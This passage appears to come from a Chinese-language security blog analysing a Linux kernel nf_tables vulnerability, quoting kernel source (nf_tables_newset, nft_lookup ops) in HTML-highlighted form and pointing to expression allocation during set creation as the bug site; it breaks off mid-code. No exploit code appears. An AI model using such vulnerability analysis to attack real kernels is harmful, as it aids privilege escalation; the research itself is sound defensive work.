class="title">nft_expr_type</span> *<span class="title">nft_basic_types</span>[] =</span> &#123;</span><br><span class="line">&amp;nft_imm_type,</span><br><span class="line">&amp;nft_cmp_type,</span><br><span class="line">&amp;nft_lookup_type,</span><br><span class="line">&amp;nft_bitwise_type,</span><br><span class="line">&amp;nft_byteorder_type,</span><br><span class="line">&amp;nft_payload_type,</span><br><span class="line">&amp;nft_dynset_type,</span><br><span class="line">&amp;nft_range_type,</span><br><span class="line">&amp;nft_meta_type,</span><br><span class="line">&amp;nft_rt_type,</span><br><span class="line">&amp;nft_exthdr_type,</span><br><span class="line">&amp;nft_last_type,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以根据上面的例子看，这里会调用到的是<code>nft_lookup_type</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span> <span class="title">nft_lookup_ops</span> =</span> &#123;</span><br><span class="line">.type= &amp;nft_lookup_type,</span><br><span class="line">.size= NFT_EXPR_SIZE(<span class="keyword">sizeof</span>(struct nft_lookup)),</span><br><span class="line">.eval= nft_lookup_eval,</span><br><span class="line">.init= nft_lookup_init,</span><br><span class="line">.activate= nft_lookup_activate,</span><br><span class="line">.deactivate= nft_lookup_deactivate,</span><br><span class="line">.destroy= nft_lookup_destroy,</span><br><span class="line">.dump= nft_lookup_dump,</span><br><span class="line">.validate= nft_lookup_validate,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> <span class="title">nft_lookup_type</span> __<span class="title">read_mostly</span> =</span> &#123;</span><br><span class="line">.name= <span class="string">&quot;lookup&quot;</span>,</span><br><span class="line">.ops= &amp;nft_lookup_ops,</span><br><span class="line">.policy= nft_lookup_policy,</span><br><span class="line">.maxattr= NFTA_LOOKUP_MAX,</span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newexpr</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nft_expr_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span> *<span class="title">ops</span> =</span> info-&gt;ops;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">expr-&gt;ops = ops;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;init) &#123;</span><br><span class="line">err = ops-&gt;init(ctx, expr, (<span class="keyword">const</span> struct nlattr **)info-&gt;tb);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err1:</span><br><span class="line">expr-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终根据不同类型进行初始化。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞发生在创建<code>set</code>的过程中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newset</span><span class="params">(struct sk_buff *skb, <span class="keyword">const</span> struct nfnl_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> struct nlattr *<span class="keyword">const</span> nla[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">u32 ktype, dtype, flags, policy, gc_int, objtype;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> *<span class="title">extack</span> =</span> info-&gt;extack;</span><br><span class="line">u8 genmask = nft_genmask_next(info-&gt;net);</span><br><span class="line">u8 family = info-&gt;nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> info-&gt;net;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_desc</span> <span class="title">desc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *udata;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> *<span class="title">set</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> alloc_size;</span><br><span class="line">u64 timeout;</span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"><span class="keyword">int</span> err, i;</span><br><span class="line">u16 udlen;</span><br><span class="line">u64 size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_TABLE] == <span class="literal">NULL</span> || nla[NFTA_SET_NAME] == <span class="literal">NULL</span> ||</span><br><span class="line">    nla[NFTA_SET_KEY_LEN] == <span class="literal">NULL</span> || nla[NFTA_SET_ID] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">ktype = NFT_DATA_VALUE;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_KEY_TYPE] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">ktype = ntohl(nla_get_be32(nla[NFTA_SET_KEY_TYPE]));</span><br><span class="line"><span class="keyword">if</span> ((ktype &amp; NFT_DATA_RESERVED_MASK) == NFT_DATA_RESERVED_MASK)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">desc.klen = ntohl(nla_get_be32(nla[NFTA_SET_KEY_LEN]));</span><br><span class="line"><span class="keyword">if</span> (desc.klen == <span class="number">0</span> || desc.klen &gt; NFT_DATA_VALUE_MAXLEN)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_FLAGS] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">flags = ntohl(nla_get_be32(nla[NFTA_SET_FLAGS]));</span><br><span class="line"><span class="keyword">if</span> (flags &amp;</span><br><span class="line">    ~(NFT_SET_ANONYMOUS | NFT_SET_CONSTANT | NFT_SET_INTERVAL |</span><br><span class="line">      NFT_SET_TIMEOUT | NFT_SET_MAP | NFT_SET_EVAL |</span><br><span class="line">      NFT_SET_OBJECT | NFT_SET_CONCAT | NFT_SET_EXPR))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"><span class="comment">/* Only one of these operations is supported */</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; (NFT_SET_MAP | NFT_SET_OBJECT)) ==</span><br><span class="line">    (NFT_SET_MAP | NFT_SET_OBJECT))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> ((flags &amp; (NFT_SET_EVAL | NFT_SET_OBJECT)) ==</span><br><span class="line">    (NFT_SET_EVAL | NFT_SET_OBJECT))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dtype = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_DATA_TYPE] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_MAP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">dtype = ntohl(nla_get_be32(nla[NFTA_SET_DATA_TYPE]));</span><br><span class="line"><span class="keyword">if</span> ((dtype &amp; NFT_DATA_RESERVED_MASK) ==</span><br><span class="line">    NFT_DATA_RESERVED_MASK &amp;&amp;</span><br><span class="line">    dtype != NFT_DATA_VERDICT)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dtype != NFT_DATA_VERDICT) &#123;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_DATA_LEN] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">desc.dlen = ntohl(nla_get_be32(nla[NFTA_SET_DATA_LEN]));</span><br><span class="line"><span class="keyword">if</span> (desc.dlen == <span class="number">0</span> || desc.dlen &gt; NFT_DATA_VALUE_MAXLEN)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">desc.dlen = <span class="keyword">sizeof</span>(struct nft_verdict);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; NFT_SET_MAP)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_OBJ_TYPE] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_OBJECT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">objtype = ntohl(nla_get_be32(nla[NFTA_SET_OBJ_TYPE]));</span><br><span class="line"><span class="keyword">if</span> (objtype == NFT_OBJECT_UNSPEC || objtype &gt; NFT_OBJECT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; NFT_SET_OBJECT)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">objtype = NFT_OBJECT_UNSPEC;</span><br><span class="line"></span><br><span class="line">timeout = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_TIMEOUT] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_TIMEOUT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = nf_msecs_to_jiffies64(nla[NFTA_SET_TIMEOUT], &amp;timeout);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">gc_int = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_GC_INTERVAL] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_TIMEOUT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">gc_int = ntohl(nla_get_be32(nla[NFTA_SET_GC_INTERVAL]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">policy = NFT_SET_POL_PERFORMANCE;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_POLICY] != <span class="literal">NULL</span>)</span><br><span class="line">policy = ntohl(nla_get_be32(nla[NFTA_SET_POLICY]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_DESC] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">err = nf_tables_set_desc_parse(&amp;desc, nla[NFTA_SET_DESC]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_EXPR] || nla[NFTA_SET_EXPRESSIONS])</span><br><span class="line">desc.expr = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_SET_TABLE], family, genmask,</span><br><span class="line"> NETLINK_CB(skb).portid);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_SET_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, info-&gt;nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> = nft_set_lookup(table, nla[NFTA_SET_NAME], genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">set</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(<span class="built_in">set</span>) != -ENOENT) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_SET_NAME]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_SET_NAME]);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_CREATE))</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line"></span><br><span class="line">ops = nft_select_set_ops(&amp;ctx, nla, &amp;desc, policy);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ops))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ops);</span><br><span class="line"></span><br><span class="line">udlen = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_USERDATA])</span><br><span class="line">udlen = nla_len(nla[NFTA_SET_USERDATA]);</span><br><span class="line"></span><br><span class="line">size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;privsize != <span class="literal">NULL</span>)</span><br><span class="line">size = ops-&gt;privsize(nla, &amp;desc);</span><br><span class="line">alloc_size = <span class="keyword">sizeof</span>(*<span class="built_in">set</span>) + size + udlen;</span><br><span class="line"><span class="keyword">if</span> (alloc_size &lt; size || alloc_size &gt; INT_MAX)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="built_in">set</span> = kvzalloc(alloc_size, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">set</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">name = nla_strdup(nla[NFTA_SET_NAME], GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err_set_name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = nf_tables_set_alloc_name(&amp;ctx, <span class="built_in">set</span>, name);</span><br><span class="line">kfree(name);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_name;</span><br><span class="line"></span><br><span class="line">udata = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (udlen) &#123;</span><br><span class="line">udata = <span class="built_in">set</span>-&gt;data + size;</span><br><span class="line">nla_memcpy(udata, nla[NFTA_SET_USERDATA], udlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">INIT_LIST_HEAD(&amp;<span class="built_in">set</span>-&gt;bindings);</span><br><span class="line">INIT_LIST_HEAD(&amp;<span class="built_in">set</span>-&gt;catchall_list);</span><br><span class="line"><span class="built_in">set</span>-&gt;table = table;</span><br><span class="line">write_pnet(&amp;<span class="built_in">set</span>-&gt;net, net);</span><br><span class="line"><span class="built_in">set</span>-&gt;ops = ops;</span><br><span class="line"><span class="built_in">set</span>-&gt;ktype = ktype;</span><br><span class="line"><span class="built_in">set</span>-&gt;klen = desc.klen;</span><br><span class="line"><span class="built_in">set</span>-&gt;dtype = dtype;</span><br><span class="line"><span class="built_in">set</span>-&gt;objtype = objtype;</span><br><span class="line"><span class="built_in">set</span>-&gt;dlen = desc.dlen;</span><br><span class="line"><span class="built_in">set</span>-&gt;flags = flags;</span><br><span class="line"><span class="built_in">set</span>-&gt;size = desc.size;</span><br><span class="line"><span class="built_in">set</span>-&gt;policy = policy;</span><br><span class="line"><span class="built_in">set</span>-&gt;udlen = udlen;</span><br><span class="line"><span class="built_in">set</span>-&gt;udata = udata;</span><br><span class="line"><span class="built_in">set</span>-&gt;timeout = timeout;</span><br><span class="line"><span class="built_in">set</span>-&gt;gc_int = gc_int;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;field_count = desc.field_count;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; desc.field_count; i++)</span><br><span class="line"><span class="built_in">set</span>-&gt;field_len[i] = desc.field_len[i];</span><br><span class="line"></span><br><span class="line">err = ops-&gt;init(<span class="built_in">set</span>, &amp;desc, nla);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_init;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_EXPR]) &#123;</span><br><span class="line">expr = nft_set_elem_expr_alloc(&amp;ctx, <span class="built_in">set</span>, nla[NFTA_SET_EXPR]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(expr)) &#123;</span><br><span class="line">err = PTR_ERR(expr);</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">set</span>-&gt;exprs[<span class="number">0</span>] = expr;</span><br><span class="line"><span class="built_in">set</span>-&gt;num_exprs++;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nla[NFTA_SET_EXPRESSIONS]) &#123;</span><br><span class="line">struct nft_expr *expr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tmp</span>;</span></span><br><span class="line"><span class="keyword">int</span> left;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_EXPR)) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">nla_for_each_nested (tmp, nla[NFTA_SET_EXPRESSIONS], left) &#123;</span><br><span class="line"><span class="keyword">if</span> (i == NFT_SET_EXPR_MAX) &#123;</span><br><span class="line">err = -E2BIG;</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nla_type(tmp) != NFTA_LIST_ELEM) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line">expr = nft_set_elem_expr_alloc(&amp;ctx, <span class="built_in">set</span>, tmp);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(expr)) &#123;</span><br><span class="line">err = PTR_ERR(expr);</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">set</span>-&gt;exprs[i++] = expr;</span><br><span class="line"><span class="built_in">set</span>-&gt;num_exprs++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;handle = nf_tables_alloc_handle(table);</span><br><span class="line"></span><br><span class="line">err = nft_trans_set_add(&amp;ctx, NFT_MSG_NEWSET, <span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line"></span><br><span class="line">list_add_tail_rcu(&amp;<span class="built_in">set</span>-&gt;<span class="built_in">list</span>, &amp;table-&gt;sets);</span><br><span class="line">table-&gt;use++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_set_expr_alloc:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">set</span>-&gt;num_exprs; i++)</span><br><span class="line">nft_expr_destroy(&amp;ctx, <span class="built_in">set</span>-&gt;exprs[i]);</span><br><span class="line"></span><br><span class="line">ops-&gt;destroy(<span class="built_in">set</span>);</span><br><span class="line">err_set_init:</span><br><span class="line">kfree(<span class="built_in">set</span>-&gt;name);</span><br><span class="line">err_set_name:</span><br><span class="line">kvfree(<span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上半部分处理<code>set</code>的跟漏洞关系不大，主要关注下面生成<code>expression</code>的过程，这里使用了<code>nft_set_elem_expr_alloc</code>函数进行申请。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct nft_expr *<span 